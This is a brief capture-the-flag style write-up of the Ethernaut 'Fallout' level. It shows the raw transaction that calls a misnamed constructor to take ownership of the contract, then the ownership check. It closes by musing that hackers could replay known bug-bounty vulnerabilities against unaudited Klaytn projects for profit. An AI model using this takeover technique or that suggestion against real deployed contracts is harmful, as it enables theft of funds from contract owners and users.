At a glance, it just seems like I just need to call Fallout() function?

But should be harder than that. 

    sendTransaction({from: "0x14a5b8f7DF340D89F3f7609dedCcE79a416E946c", to: "0x33A83D7bF84D70B21a2C9E72C09e258CC9D50B6d", data: "0x6fab5ddf", value: toWei("0.001")}).then((receipt)=> {console.log(receipt)});

Transaction Mined.

Now Imma try to submit the instance. oh, before that Imma check the owner address;

    contract.owner();;

Well. I am the owner. so now I submit the instance.

Boom. Solved.

According to what the game says when the level was completed.
DynamicPyramid() guys did not change its contractor's name when the contract was changing to
'Rubixi',  I think since Klaytn contracts are usually not open source and not really audited,
they should have a whole lot of shits like this.
I mean, when Klayswap was hacked, it was such a simple frontend hack.
Maybe hackers can go through the vulnerability found in bugbounties and try exact same mal-intended
approaches to Klaytn deployed projects, hackers will be rich.
